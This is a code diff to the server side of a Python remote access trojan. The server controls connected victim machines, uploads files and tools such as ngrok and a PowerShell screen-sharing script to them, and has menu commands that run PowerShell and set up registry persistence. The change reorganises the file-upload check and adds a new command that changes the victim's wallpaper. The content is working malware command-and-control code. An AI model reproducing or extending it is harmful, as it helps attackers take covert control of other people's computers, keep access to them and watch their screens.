@@ -131,11 +131,9 @@ def reliable_send(target, data):
 
 
 def upload_file(target, file_name):
-    if isfile(file_name) == True:
         f = open(file_name, 'rb')
         target.send(f.read())
-    else:
-        print('didn t find the file')
+
 
 
 
@@ -166,7 +164,10 @@ def target_communication(target, ip):
         elif command == 'clear':
             os.system('cls')
         elif command[:6] == 'upload':
-            upload_file(target, command[7:])
+            if isfile(command[7:]) == True:
+                upload_file(target, command[7:])
+            else:
+               pass
         elif command == 'ngroksetup':
             upload_file(target,'scripts\\ngrok.exe')
         elif command[:8] == 'download':
@@ -212,9 +213,12 @@ def target_communication(target, ip):
             ssharescreen                       --> stopstreaming
             ngroksetup                         --> download ngrok on the client
             changepolicy                       --> execute powershell scripts
-            persistence *RegName* *fileName*   --> Create Persistence In Registry'''))
+            cwallpaper                         --> change wallpaper
+            persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
         elif command[:11] == 'screenshare':
             upload_file(target,'scripts\\screenshare.ps1')
+        elif command[:10] == 'cwallpaper':
+                upload_file(target,command[11:])
 
         else:
             result = reliable_recv(target)
